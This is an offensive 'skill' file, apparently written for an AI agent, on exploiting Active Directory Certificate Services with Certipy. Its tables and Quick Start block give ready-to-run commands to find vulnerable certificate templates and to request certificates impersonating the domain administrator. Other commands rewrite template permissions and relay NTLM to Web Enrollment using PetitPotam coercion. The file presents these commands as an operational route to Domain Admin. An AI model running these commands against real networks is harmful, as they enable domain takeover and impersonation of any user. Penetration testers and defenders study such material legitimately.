---
name: certipy-adcs-exploitation
description: ADCS exploitation via Certipy covering ESC1 through ESC13. Enumerates vulnerable certificate templates, exploits SAN specification (ESC1), template ACL abuse (ESC4), Web Enrollment NTLM Relay (ESC8), and provider configuration flaws.
skill_type: exploit
severity: critical
tags: [adcs, certipy, esc1, esc4, esc8, certificate-services, privilege-escalation, pki, active-directory]
cve: []
---

# Certipy ADCS Exploitation (ESC1-ESC13)

## Essential Principles

1. ADCS (Active Directory Certificate Services) is a PKI implementation that issues X.509 certificates — abuse enables privilege escalation to Domain Admin
2. Certipy automates enumeration and exploitation of 13 known ESC (ESCalation) attack vectors against ADCS misconfigurations
3. ESC1 (SAN Specification): If a certificate template allows requesters to specify a Subject Alternative Name (SAN), any authenticated user can request a certificate as any other user (including Domain Admin)
4. ESC4 (Template ACL Write): If a low-privilege user has WriteOwner/WriteDacl/GenericWrite on a certificate template, they can modify the template to enable ESC1
5. ESC8 (Web Enrollment NTLM Relay): If ADCS Web Enrollment HTTP endpoint lacks EPA (Extended Protection for Authentication) and HTTPS, NTLM can be relayed to request certificates for relayed principals

## When to Use

- Active Directory environment with Certificate Services installed (CA server present)
- Valid domain credentials (even low-privilege) — enumeration of vulnerable templates requires authentication
- Identified vulnerable certificate template after enumeration (certipy find -vulnerable)
- Web Enrollment endpoint accessible (http://CA/certsrv/) for ESC8 relay attack

## When NOT to Use

- No ADCS present in the domain (no CA server, no Certificate Templates)
- Enrollment requires approved manager signatures and no privilege to modify templates (ESC4 path blocked)
- Web Enrollment uses EPA + HTTPS (ESC8 path blocked)
- Fully patched and properly configured CA with all ESC vectors mitigated

## Path Selection

| Condition | Path | Command |
|-----------|------|---------|
| SAN-enabled vulnerable template | esc1 | `certipy req -ca CA -template VulnTemplate -upn admin@domain` |
| WriteDacl/GenericWrite on template | esc4 | `certipy template -ca CA -template VulnTemplate -save-old -enable-san` |
| Web Enrollment without EPA | esc8 | `certipy relay -ca CA` + `petitpotam` or `printerbug` coercion |
| EDITF_ATTRIBUTESUBJECTALTNAME2 flag | esc6 | `certipy req -ca CA -template User -upn admin@domain` |
| Manager approval disabled + enrollment | esc3 | `certipy req -ca CA -template ESC3-Template -on-behalf-of 'DOMAIN\user'` |

## Quick Start

```bash
# Enumerate vulnerable certificate templates
certipy find -vulnerable -u 'user@domain.local' -p 'Password123' -dc-ip 10.0.0.10 -stdout

# ESC1: Request certificate with arbitrary SAN (impersonate Domain Admin)
certipy req -u 'user@domain.local' -p 'Password123' -ca 'CA-SERVER-CA' -template 'VulnTemplate' -upn 'administrator@domain.local' -dc-ip 10.0.0.10

# Authenticate with the obtained certificate
certipy auth -pfx 'administrator.pfx' -dc-ip 10.0.0.10

# ESC4: Overwrite template to enable SAN specification (needs template ACL rights)
certipy template -u 'user@domain.local' -p 'Password123' -ca 'CA-SERVER-CA' -template 'VulnTemplate' -save-old -enable-san -dc-ip 10.0.0.10

# ESC8: NTLM relay to Web Enrollment
certipy relay -ca 'CA-SERVER-CA' -template 'DomainController' &
python3 petitpotam.py -d 'domain.local' -u 'user' -p 'pass' 'attacker-ip' 'target-dc'
```

## ESC Vectors Summary

| ESC | Name | Requirement | Impact |
|-----|------|-------------|--------|
| ESC1 | SAN Specification | Template allows CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT | Impersonate any user |
| ESC2 | Any Purpose EKU | Template includes Any Purpose EKU (2.5.29.37.0) | Subordinate CA certificate |
| ESC3 | Enrollment Agent | Template has Certificate Request Agent EKU | Request cert on behalf of others |
| ESC4 | Template ACL Write | WriteOwner/WriteDacl/GenericWrite on template | Overwrite template → ESC1 |
| ESC5 | PKI Object Control | Control over AD PKI objects (CA, containers) | PKI persistence |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | CA flag allows SAN from any user | Same as ESC1 |
| ESC7 | Certificate Authority Access | ManageCA or ManageCertificates rights | Issue/approve arbitrary certs |
| ESC8 | Web Enrollment Relay | HTTP enrollment without EPA/HTTPS | Relay NTLM to get certs |
| ESC9 | No Security Extension | Template lacks CT_FLAG_NO_SECURITY_EXTENSION | msPKI-Enrollment-Flag abuse |
| ESC10 | Weak Certificate Mapping | X509 w/ weak SID mapping | Privilege escalation |
| ESC11 | IFD_ENFORCEENCRYPTICERTREQUEST | Missing encryption enforcement | Relaying, MITM |
| ESC12 | Shell access to CA server | Local admin on CA | Steal private keys |
| ESC13 | OID Group Link | Misconfigured issuance policies | Group membership escalation |
